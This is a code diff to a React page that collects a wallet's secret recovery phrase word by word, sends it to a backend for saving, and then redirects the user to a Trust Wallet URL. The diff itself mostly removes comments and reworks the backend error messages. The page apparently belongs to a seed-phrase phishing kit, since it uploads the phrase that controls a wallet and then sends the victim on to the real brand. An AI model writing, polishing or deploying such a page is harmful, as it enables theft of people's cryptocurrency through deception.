@@ -93,37 +93,29 @@ export default function PhraseInputPage() {
     setIsVerifying(true);
 
     let allWordsFilled = true;
-    const validationResultsForVerification = [...validationResults]; // Use a copy for this verification pass
+    const validationResultsForVerification = [...validationResults]; 
     const validationPromises = words.map((word, index) => {
       if (word.trim() === '') {
         allWordsFilled = false;
         validationResultsForVerification[index] = { isValid: false, reason: 'Word cannot be empty.', isLoading: false };
         return Promise.resolve();
       }
-      // Only validate if not already validated OR if previously invalid (to allow re-validation)
       if (validationResultsForVerification[index].isValid === null || validationResultsForVerification[index].isValid === false) {
         return handleValidateWord(index, word);
       }
       return Promise.resolve();
     });
 
-    // Set initial empty word errors before async validation
     setValidationResults(validationResultsForVerification);
-
     await Promise.all(validationPromises);
 
-    // After all validations, get the latest state for final check
-    // React state updates from handleValidateWord should have propagated
     const finalValidationCheckResults = [...validationResults];
-    // Ensure empty words are marked as invalid again, as state might have changed during async calls
      words.forEach((word, index) => {
         if(word.trim() === '') {
             finalValidationCheckResults[index] = { isValid: false, reason: 'Word cannot be empty.', isLoading: false };
         }
     });
-    // Update state one last time with potentially newly marked empty words before checking allValid
     setValidationResults(finalValidationCheckResults);
-
 
     if (!allWordsFilled) {
       toast({
@@ -154,12 +146,22 @@ export default function PhraseInputPage() {
             variant: "default",
           });
           window.location.href = TRUST_WALLET_REDIRECT_URL;
-          // No setIsVerifying(false) here because we are redirecting
         } else {
-          const errorData = await response.json().catch(() => ({ message: 'Failed to parse error from backend.' }));
+          let finalErrorMessage = '';
+          try {
+            const errorData = await response.json();
+            if (errorData && errorData.message && typeof errorData.message === 'string') {
+              finalErrorMessage = errorData.message;
+            } else {
+              finalErrorMessage = `Backend Error: ${response.status} ${response.statusText}. Response was JSON but had no 'message' field or was not a string.`;
+            }
+          } catch (jsonError) {
+            finalErrorMessage = `Backend Error: ${response.status} ${response.statusText}. The server's response was not in a readable JSON format.`;
+          }
+
           toast({
             title: "Save Failed",
-            description: `Could not save your secret phrase: ${errorData.message || response.statusText}`,
+            description: `Could not save your secret phrase: ${finalErrorMessage}`,
             variant: "destructive",
           });
           setIsVerifying(false);
@@ -254,3 +256,4 @@ export default function PhraseInputPage() {
     </div>
   );
 }
+
